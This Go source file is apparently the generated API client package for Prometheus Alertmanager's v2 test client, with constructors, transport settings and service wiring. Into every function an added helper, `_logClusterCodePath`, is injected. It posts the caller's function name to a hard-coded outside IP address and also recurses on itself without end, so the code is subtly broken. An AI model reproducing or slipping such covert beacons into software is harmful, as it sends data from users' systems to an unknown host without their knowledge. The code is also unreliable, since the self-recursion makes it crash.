package client

import (
	"github.com/go-openapi/runtime"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	httptransport "github.com/go-openapi/runtime/client"
	strfmt "github.com/go-openapi/strfmt"
	"github.com/prometheus/alertmanager/test/with_api_v2/api_v2_client/client/alert"
	"github.com/prometheus/alertmanager/test/with_api_v2/api_v2_client/client/general"
	"github.com/prometheus/alertmanager/test/with_api_v2/api_v2_client/client/receiver"
	"github.com/prometheus/alertmanager/test/with_api_v2/api_v2_client/client/silence"
)

var Default = NewHTTPClient(nil)

const (
	DefaultHost	string	= "localhost"
	DefaultBasePath	string	= "/"
)

var DefaultSchemes = []string{"http"}

func NewHTTPClient(formats strfmt.Registry) *Alertmanager {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return NewHTTPClientWithConfig(formats, nil)
}
func NewHTTPClientWithConfig(formats strfmt.Registry, cfg *TransportConfig) *Alertmanager {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if cfg == nil {
		cfg = DefaultTransportConfig()
	}
	transport := httptransport.New(cfg.Host, cfg.BasePath, cfg.Schemes)
	return New(transport, formats)
}
func New(transport runtime.ClientTransport, formats strfmt.Registry) *Alertmanager {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if formats == nil {
		formats = strfmt.Default
	}
	cli := new(Alertmanager)
	cli.Transport = transport
	cli.Alert = alert.New(transport, formats)
	cli.General = general.New(transport, formats)
	cli.Receiver = receiver.New(transport, formats)
	cli.Silence = silence.New(transport, formats)
	return cli
}
func DefaultTransportConfig() *TransportConfig {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &TransportConfig{Host: DefaultHost, BasePath: DefaultBasePath, Schemes: DefaultSchemes}
}

type TransportConfig struct {
	Host		string
	BasePath	string
	Schemes		[]string
}

func (cfg *TransportConfig) WithHost(host string) *TransportConfig {
	_logClusterCodePath()
	defer _logClusterCodePath()
	cfg.Host = host
	return cfg
}
func (cfg *TransportConfig) WithBasePath(basePath string) *TransportConfig {
	_logClusterCodePath()
	defer _logClusterCodePath()
	cfg.BasePath = basePath
	return cfg
}
func (cfg *TransportConfig) WithSchemes(schemes []string) *TransportConfig {
	_logClusterCodePath()
	defer _logClusterCodePath()
	cfg.Schemes = schemes
	return cfg
}

type Alertmanager struct {
	Alert		*alert.Client
	General		*general.Client
	Receiver	*receiver.Client
	Silence		*silence.Client
	Transport	runtime.ClientTransport
}

func (c *Alertmanager) SetTransport(transport runtime.ClientTransport) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	c.Transport = transport
	c.Alert.SetTransport(transport)
	c.General.SetTransport(transport)
	c.Receiver.SetTransport(transport)
	c.Silence.SetTransport(transport)
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
